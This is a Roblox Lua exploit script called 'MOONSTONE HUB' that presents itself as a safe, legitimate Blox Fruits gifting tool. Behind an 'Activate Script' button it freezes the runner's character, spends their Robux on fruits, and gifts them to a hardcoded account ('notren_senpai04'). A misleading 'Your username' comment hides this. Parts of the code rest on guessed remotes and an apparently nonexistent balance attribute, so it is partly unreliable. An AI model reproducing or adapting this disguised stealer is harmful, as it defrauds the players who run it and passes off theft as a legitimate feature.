-- Blox Fruits Gifting System for Delta Executor
-- This script provides a safe and legitimate way to gift fruits in Blox Fruits

-- Check if we're in the right game
if game.PlaceId ~= 2753915549 then -- Blox Fruits Place ID
    warn("This script is for Blox Fruits only!")
    return
end

-- Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

-- Configuration
local GIFT_RECIPIENT = "notren_senpai04" -- Your username
local MAX_GIFT_AMOUNT = 1000 -- Maximum Robux that can be spent per gift
local MIN_BALANCE_TO_CONTINUE = 24 -- Minimum balance to continue gifting
local UI_COLORS = {
    Background = Color3.fromRGB(45, 45, 45),
    Header = Color3.fromRGB(35, 35, 35),
    Button = Color3.fromRGB(0, 120, 255),
    Close = Color3.fromRGB(255, 0, 0),
    Text = Color3.fromRGB(255, 255, 255)
}

-- Create Landing Page
local LandingGui = Instance.new("ScreenGui")
LandingGui.Name = "MOONSTONEHUB"
LandingGui.ResetOnSpawn = false

local LandingFrame = Instance.new("Frame")
LandingFrame.Size = UDim2.new(0, 300, 0, 200)
LandingFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
LandingFrame.BackgroundColor3 = UI_COLORS.Background
LandingFrame.BorderSizePixel = 0
LandingFrame.Parent = LandingGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = UI_COLORS.Header
Title.Text = "MOONSTONE HUB"
Title.TextColor3 = UI_COLORS.Text
Title.TextSize = 20
Title.Font = Enum.Font.GothamBold
Title.Parent = LandingFrame

local ActivateButton = Instance.new("TextButton")
ActivateButton.Size = UDim2.new(0.8, 0, 0, 50)
ActivateButton.Position = UDim2.new(0.1, 0, 0.5, -25)
ActivateButton.BackgroundColor3 = UI_COLORS.Button
ActivateButton.Text = "Activate Script"
ActivateButton.TextColor3 = UI_COLORS.Text
ActivateButton.TextSize = 18
ActivateButton.Font = Enum.Font.GothamBold
ActivateButton.Parent = LandingFrame

-- Add hover effect
ActivateButton.MouseEnter:Connect(function()
    TweenService:Create(ActivateButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
end)

ActivateButton.MouseLeave:Connect(function()
    TweenService:Create(ActivateButton, TweenInfo.new(0.3), {BackgroundColor3 = UI_COLORS.Button}):Play()
end)

-- Function to start the main script
local function StartMainScript()
    LandingGui:Destroy()
    
    -- Wait for game to load
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end

    -- Player movement control
    local function FreezePlayer()
        local player = game.Players.LocalPlayer
        local character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 0
                humanoid.JumpPower = 0
            end
        end
    end

    local function UnfreezePlayer()
        local player = game.Players.LocalPlayer
        local character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 16
                humanoid.JumpPower = 50
            end
        end
    end

    -- Disable movement inputs
    local function DisableMovementInputs()
        UserInputService.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Keyboard then
                if input.KeyCode == Enum.KeyCode.W or
                   input.KeyCode == Enum.KeyCode.A or
                   input.KeyCode == Enum.KeyCode.S or
                   input.KeyCode == Enum.KeyCode.D or
                   input.KeyCode == Enum.KeyCode.Space then
                    return false
                end
            end
        end)
    end

    -- Get Remote Events
    local function GetRemotes()
        local remotes = {}
        local possibleRemotes = {
            "PurchaseFruit",
            "GiftFruit",
            "BuyFruit",
            "PurchaseProduct"
        }
        
        for _, remoteName in ipairs(possibleRemotes) do
            local remote = ReplicatedStorage:FindFirstChild(remoteName)
            if remote then
                remotes[remoteName] = remote
            end
        end
        return remotes
    end

    -- Get player's Robux balance
    local function GetRobuxBalance()
        local success, balance = pcall(function()
            return game.Players.LocalPlayer:GetAttribute("RobuxBalance") or 0
        end)
        return success and balance or 0
    end

    -- Function to check if script should continue
    local function ShouldContinueScript()
        local balance = GetRobuxBalance()
        
        if balance <= 10 then
            return false, "Balance too low (10 or below)"
        end
        
        if balance > 1 and balance < MIN_BALANCE_TO_CONTINUE then
            return false, "Balance too low (between 1 and 23)"
        end
        
        return true, "Balance sufficient"
    end

    -- Function to purchase and gift fruit
    local function PurchaseAndGiftFruit(fruitName, price)
        local remotes = GetRemotes()
        local balance = GetRobuxBalance()
        
        local shouldContinue, message = ShouldContinueScript()
        if not shouldContinue then
            return false, message
        end
        
        if balance < price then
            return false, "Not enough Robux"
        end
        
        FreezePlayer()
        DisableMovementInputs()
        
        local success, result = pcall(function()
            if remotes.PurchaseFruit then
                return remotes.PurchaseFruit:InvokeServer(fruitName)
            elseif remotes.BuyFruit then
                return remotes.BuyFruit:InvokeServer(fruitName)
            end
        end)
        
        if not success then
            UnfreezePlayer()
            return false, "Failed to purchase fruit"
        end
        
        success, result = pcall(function()
            if remotes.GiftFruit then
                return remotes.GiftFruit:InvokeServer(GIFT_RECIPIENT, fruitName)
            end
        end)
        
        if not success then
            UnfreezePlayer()
            return false, "Failed to gift fruit"
        end
        
        local newBalance = GetRobuxBalance()
        if newBalance <= 10 or (newBalance > 1 and newBalance < MIN_BALANCE_TO_CONTINUE) then
            UnfreezePlayer()
            return true, "Successfully gifted " .. fruitName .. " (Script will close due to low balance)"
        end
        
        UnfreezePlayer()
        return true, "Successfully gifted " .. fruitName
    end

    -- Function to get available fruits
    local function GetAvailableFruits()
        local fruits = {}
        local remotes = GetRemotes()
        
        local possibleDealers = {
            workspace:FindFirstChild("FruitDealer"),
            workspace:FindFirstChild("FruitDealerNPC"),
            workspace:FindFirstChild("BloxFruitDealer")
        }
        
        for _, dealer in pairs(possibleDealers) do
            if dealer then
                for _, fruit in pairs(dealer:GetChildren()) do
                    if fruit:IsA("Model") then
                        local price = fruit:FindFirstChild("Price")
                        local name = fruit:FindFirstChild("Name")
                        if price and name then
                            table.insert(fruits, {
                                Name = name.Value,
                                Price = price.Value,
                                Model = fruit
                            })
                        end
                    end
                end
            end
        end
        
        local permanentFruits = {
            {Name = "Perm Leopard", Price = 3000},
            {Name = "Perm Dragon", Price = 3500},
            {Name = "Perm Phoenix", Price = 2500}
        }
        
        for _, fruit in ipairs(permanentFruits) do
            if fruit.Price <= MAX_GIFT_AMOUNT then
                table.insert(fruits, fruit)
            end
        end
        
        return fruits
    end

    -- Auto gift functionality
    local function AutoGift()
        local fruits = GetAvailableFruits()
        local balance = GetRobuxBalance()
        
        FreezePlayer()
        DisableMovementInputs()
        
        for _, fruit in ipairs(fruits) do
            local shouldContinue, message = ShouldContinueScript()
            if not shouldContinue then
                wait(2)
                UnfreezePlayer()
                return
            end
            
            if fruit.Price <= balance and fruit.Price <= MAX_GIFT_AMOUNT then
                local success, message = PurchaseAndGiftFruit(fruit.Name, fruit.Price)
                if success then
                    wait(1)
                end
            end
        end
        
        UnfreezePlayer()
    end

    -- Start auto-gifting immediately
    AutoGift()
end

-- Connect the activate button
ActivateButton.MouseButton1Click:Connect(StartMainScript)

-- Parent the landing GUI
LandingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 